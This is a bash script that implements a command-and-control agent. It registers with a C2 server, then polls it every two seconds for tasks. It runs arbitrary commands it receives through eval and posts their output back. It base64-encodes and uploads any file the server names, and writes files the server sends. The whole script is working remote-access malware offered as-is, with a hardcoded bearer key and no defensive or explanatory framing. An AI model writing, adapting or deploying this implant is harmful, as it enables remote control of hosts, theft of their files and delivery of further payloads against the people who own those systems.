#!/bin/bash

C2_SERVER_IP="http://127.0.0.1:80"
AUTH="MySecretKey123"
POLL_INTERVAL=2

# Register agent
AGENT_ID=$(curl -s -X POST -H "Authorization: Bearer $AUTH" $C2_SERVER_IP/register | jq -r .agent_id)

while true; do
    TASK=$(curl -s -H "Authorization: Bearer $AUTH" $C2_SERVER_IP/task/$AGENT_ID | jq -r .task)

    if [ "$TASK" != "null" ] && [ -n "$TASK" ]; then

        # Check if TASK is JSON (starts with {)
        if [[ "$TASK" =~ ^\{ ]]; then
            TASK_TYPE=$(echo "$TASK" | jq -r '.type // empty')

            # File download (agent -> server)
            if [ "$TASK_TYPE" == "get" ]; then
                REMOTE_PATH=$(echo "$TASK" | jq -r '.path')
                if [ -f "$REMOTE_PATH" ]; then
                    FILENAME=$(basename "$REMOTE_PATH")
                    B64=$(base64 "$REMOTE_PATH" | tr -d '\n')
                    PAYLOAD="{\"type\":\"file\",\"filename\":\"$FILENAME\",\"data\":\"$B64\"}"
                    curl -s -X POST -H "Authorization: Bearer $AUTH" -H "Content-Type: application/json" -d "$PAYLOAD" $C2_SERVER_IP/result/$AGENT_ID
                else
                    curl -s -X POST -H "Authorization: Bearer $AUTH" -d "[GET ERROR] File not found: $REMOTE_PATH" $C2_SERVER_IP/result/$AGENT_ID
                fi

            # File upload (server -> agent)
            elif [ "$TASK_TYPE" == "put" ]; then
                FILENAME=$(echo "$TASK" | jq -r '.filename')
                B64=$(echo "$TASK" | jq -r '.data')

                # Ensure directory exists
                DIRNAME=$(dirname "$FILENAME")
                mkdir -p "$DIRNAME"

                # Write the file
                echo "$B64" | base64 --decode > "$FILENAME"

                # Notify server (CLI)
                curl -s -X POST -H "Authorization: Bearer $AUTH" -d "[PUT] Saved file: $FILENAME" $C2_SERVER_IP/result/$AGENT_ID
            fi

        else
            # Normal shell command
            RESULT=$(eval "$TASK" 2>&1)
            curl -s -X POST -H "Authorization: Bearer $AUTH" -d "$RESULT" $C2_SERVER_IP/result/$AGENT_ID
        fi
    fi

    sleep $POLL_INTERVAL
done
